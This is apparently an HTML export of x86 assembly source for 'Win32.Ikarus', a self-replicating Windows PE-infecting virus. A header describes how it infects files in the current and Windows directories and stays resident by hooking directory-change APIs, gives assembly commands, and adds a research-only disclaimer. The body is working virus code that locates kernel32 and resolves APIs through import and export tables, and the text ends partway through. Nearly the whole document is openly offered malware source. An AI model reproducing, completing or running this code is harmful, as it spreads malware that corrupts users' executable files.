<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment ~</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; NAME: Win32.Ikarus</span><span class="sc0">
</span><span class="sc1">; AUTHOR: Black Jack [independant Austrian Win32asm virus coder]</span><span class="sc0">
</span><span class="sc1">; CONTACT: Black_Jack_VX@hotmail.com | http://blackjackvx.cjb.net</span><span class="sc0">
</span><span class="sc1">; TYPE: fully Win32 compatible direct-acting/per-process resident PE appender</span><span class="sc0">
</span><span class="sc1">; SIZE: 1906 bytes</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; DESCRIPTION:</span><span class="sc0">
</span><span class="sc1">; When an infected file is run, the virus gains controls. It then infects all</span><span class="sc0">
</span><span class="sc1">; infectable PE files in the current and the Windows directory by the standart</span><span class="sc0">
</span><span class="sc1">; last section expanding method. After that, it also goes per-process memory</span><span class="sc0">
</span><span class="sc1">; resident by hooking the ChangeDirectory API (both ANSI and unicode version)</span><span class="sc0">
</span><span class="sc1">; in the hosts import table, so everytime the host will change the current</span><span class="sc0">
</span><span class="sc1">; directory, all PE files in there will become infected too.</span><span class="sc0">
</span><span class="sc1">; So this is a *very* simple virus, I only did it because I wanted a really</span><span class="sc0">
</span><span class="sc1">; stable and compatible virus (it even works in Win32s) with a fully correct</span><span class="sc0">
</span><span class="sc1">; PE infection algorithm.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ASSEMBLE WITH: </span><span class="sc0">
</span><span class="sc1">;                 tasm32 /mx /m ikarus.asm</span><span class="sc0">
</span><span class="sc1">;                 tlink32 /Tpe /aa ikarus.obj,,, import32.lib</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                 there's no need for PEWRSEC or a similar tool, because the</span><span class="sc0">
</span><span class="sc1">;                 virus code is stored in the data section.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; DISCLAIMER: I do *NOT* support the spreading of viruses in the wild.</span><span class="sc0">
</span><span class="sc1">;             Therefore, this source was only written for research and</span><span class="sc0">
</span><span class="sc1">;             education. Please do not spread it. The author can't be hold</span><span class="sc0">
</span><span class="sc1">;             responsible for what you decide to do with this source.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ~</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">virus_raw_size</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_physical_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_virtual_size</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_virtual_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">workspace</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">((((</span><span class="sc5">virus_raw_size</span><span class="sc4">/</span><span class="sc2">1024</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">1024</span><span class="sc4">)+</span><span class="sc2">4096</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">Extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">Extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">; save flags</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                   </span><span class="sc1">; save all registers</span><span class="sc0">


        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">over_SEH_handler</span><span class="sc0">                   </span><span class="sc1">; push offset of SEH handler</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; restore ESP</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">return_to_host</span><span class="sc0">                      </span><span class="sc1">; jump back to host</span><span class="sc0">

</span><span class="sc5">over_SEH_handler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; save old SEH pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                         </span><span class="sc1">; set new SEH frame</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">                               </span><span class="sc1">; get delta offset</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">next</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                            </span><span class="sc1">; EAX=delta offset</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc0">                                  </span><span class="sc1">; sub eax, imm32</span><span class="sc0">
</span><span class="sc5">virus_RVA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">                              </span><span class="sc1">; RVA of virus</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; EAX=imagebase of host</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save imagebase</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">                                  </span><span class="sc1">; add eax, imm32</span><span class="sc0">
</span><span class="sc5">host_entry_RVA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                         </span><span class="sc1">; original host entry RVA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_entry</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; EAX=host entrypoint</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EAX=0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; zeroinit important API VAs</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32descr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; zero init var</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; EAX=imagebase</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EBX=imagebase</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EBX=host PE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EBX=import directory RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EBX=import directory VA</span><span class="sc0">

</span><span class="sc5">search_kernel32_import_descriptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; ESI=dll name RVA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; a zero means end of table</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">import_method_failed</span><span class="sc0">                 </span><span class="sc1">; kernel32 import descriptor</span><span class="sc0">
                                                </span><span class="sc1">; not found</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; ESI=dll name VA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; get first dword of dll name</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">                  </span><span class="sc1">; make uppercase</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"NREK"</span><span class="sc0">                         </span><span class="sc1">; is it KERNEL32 ?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">try_next_import_descriptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; check next dword</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">2020h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"23LE"</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">kernel32_import_descriptor_found</span><span class="sc0">

</span><span class="sc5">try_next_import_descriptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">                             </span><span class="sc1">; go to next import descriptor</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">search_kernel32_import_descriptor</span><span class="sc0">        

</span><span class="sc5">kernel32_import_descriptor_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32descr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; save KERNEL32 import descr</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; EDX=RVA of API names array</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; not existant anymore ?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">import_method_failed</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; RVA-&gt;VA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                  </span><span class="sc1">; ECX=5</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">get_apis_from_imports_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">init_api_ptrs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                                                </span><span class="sc1">; EDI="RVA" to an API we're</span><span class="sc0">
                                                </span><span class="sc1">; searching for</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                            </span><span class="sc1">; add delta offset</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; save ECX (counter)</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">search_API_in_imports</span><span class="sc0">              </span><span class="sc1">; search this API in imports</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">this_API_not_found</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; ECX=counter</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; save again</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; make counter 0..n-1</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                              </span><span class="sc1">; multiply with 2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">init_api_VAs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">; store API offset</span><span class="sc0">
</span><span class="sc5">this_api_not_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; restore ECX (counter)</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">get_apis_from_imports_loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0"> </span><span class="sc5">try_GetModuleHandleW</span><span class="sc0">               </span><span class="sc1">; we haven't got this API</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32A</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EAX=pointer to KERNEL32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; call GetModuleHandleA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; failed ?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">got_kernel32</span><span class="sc0">                        </span><span class="sc1">; if not, we have K32 handle</span><span class="sc0">

</span><span class="sc5">try_GetModuleHandleW</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleW</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0"> </span><span class="sc5">import_method_failed</span><span class="sc0">               </span><span class="sc1">; we haven't got this API</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32W</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; call GetModuleHandleW</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; failed ?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">got_kernel32</span><span class="sc0">                        </span><span class="sc1">; if not, we have K32 handle</span><span class="sc0">

</span><span class="sc5">import_method_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; get address in kernel32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFF000h</span><span class="sc0">                     </span><span class="sc1">; set it at a page start</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">                                 </span><span class="sc1">; ECX=50 (number of pages)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">scan_for_kernel32_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">                </span><span class="sc1">; is there an MZ header ?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">scan_on_for_kernel32</span><span class="sc0">                </span><span class="sc1">; if not, scan on</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EBX=MZ header offset</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EBX=new header offset</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">               </span><span class="sc1">; is there a PE header ?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">got_kernel32</span><span class="sc0">                         </span><span class="sc1">; if not, scan on</span><span class="sc0">
</span><span class="sc5">scan_on_for_kernel32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                          </span><span class="sc1">; go down to next page</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">scan_for_kernel32_loop</span><span class="sc0">             </span><span class="sc1">; scan the next page</span><span class="sc0">

</span><span class="sc5">kernel32_scanning_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">return_to_host</span><span class="sc0">                      </span><span class="sc1">; we didn't get K32 handle :-(</span><span class="sc0">

</span><span class="sc5">got_kernel32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; save kernel32 address</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddress</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; have we already</span><span class="sc0">
                                                </span><span class="sc1">; GetProcAddress ?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">got_GetProcAddress</span><span class="sc0">

</span><span class="sc5">get_GetProcAddress_from_export_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EBX=PE header RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EBX=PE header VA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EBX=export directory RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EBX=export directory VA</span><span class="sc0">
        
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">; ECX=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EDX=NumberOfNames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EDI=AddressOfNames array RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EDI=AddressOfNames array VA</span><span class="sc0">

</span><span class="sc5">search_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">; EDI=kernel32 base</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; EAX=next api name RVA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">; EDI=next api name RVA,</span><span class="sc0">
                                                </span><span class="sc1">; EAX=kernel32 base</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EDI=next api name VA</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                   </span><span class="sc1">; save all registers</span><span class="sc0">
